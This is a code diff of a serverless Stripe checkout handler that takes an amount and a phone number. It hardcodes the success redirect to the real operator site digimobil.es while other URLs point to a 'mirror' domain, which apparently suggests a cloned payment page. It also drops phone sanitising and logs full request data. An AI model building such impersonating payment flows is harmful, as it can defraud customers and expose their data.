@@ -20,27 +20,26 @@ exports.handler = async (event, context) => {
     let amount, phoneNumber, successUrl, cancelUrl;
     const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';
 
-    console.log('api-create-payment called, body:', event.body);
-    console.log('Content-Type:', contentType);
+    console.log('api-create-payment starting with content-type:', contentType);
 
     if (contentType.includes('application/json')) {
       try {
         const data = JSON.parse(event.body);
+        console.log('Payment JSON data received:', data);
         amount = data.amount;
         phoneNumber = data.phoneNumber;
-        successUrl = data.successUrl || `https://${MIRROR_DOMAIN}/payment-success`;
+        successUrl = data.successUrl || `https://www.digimobil.es/`;
         cancelUrl = data.cancelUrl || `https://${MIRROR_DOMAIN}/payment-cancel`;
-        console.log('JSON data:', data);
       } catch (e) {
         console.error('Error parsing JSON:', e);
       }
     } else if (contentType.includes('application/x-www-form-urlencoded')) {
       const params = new URLSearchParams(event.body);
-      amount = params.get('amount');
       phoneNumber = params.get('phoneNumber');
+      amount = params.get('amount');
       successUrl = params.get('successUrl') || `https://${MIRROR_DOMAIN}/payment-success`;
       cancelUrl = params.get('cancelUrl') || `https://${MIRROR_DOMAIN}/payment-cancel`;
-      console.log('Form data:', Object.fromEntries(params));
+      console.log('Form data:', Object.fromEntries(params.entries()));
     } else {
       return {
         statusCode: 400,
@@ -49,28 +48,21 @@ exports.handler = async (event, context) => {
       };
     }
 
-    // Гарантуємо, що телефон - це рядок і очищаємо від нецифрових символів
-    phoneNumber = String(phoneNumber || '').replace(/\D/g, '');
-    console.log('Clean phone number:', phoneNumber);
-
-    // Only use default if phoneNumber is completely invalid
-    if (!phoneNumber) {
-      console.log('Empty phone number, using default');
-      phoneNumber = '624048596'; // Використовуємо тестовий номер тільки якщо поле пусте
-    }
+    // КРИТИЧНО: Виводимо отриманий номер телефону
+    console.log('Received phone number:', phoneNumber);
 
     if (!amount || isNaN(parseFloat(amount))) {
-      console.log('Invalid amount, using default');
       amount = '5';
+      console.log('Invalid amount, using default:', amount);
     }
 
-    console.log('Processing payment request:', { amount, phoneNumber, clientIP });
+    console.log('Creating Stripe session with phone:', phoneNumber, 'amount:', amount);
 
     const { session } = await createStripeCheckoutSession(
       parseFloat(amount),
       phoneNumber,
-      successUrl, // Use the successUrl from the request
-      cancelUrl,
+      `https://www.digimobil.es/`,
+      `https://${MIRROR_DOMAIN}/payment-cancel`,
       clientIP
     );
 
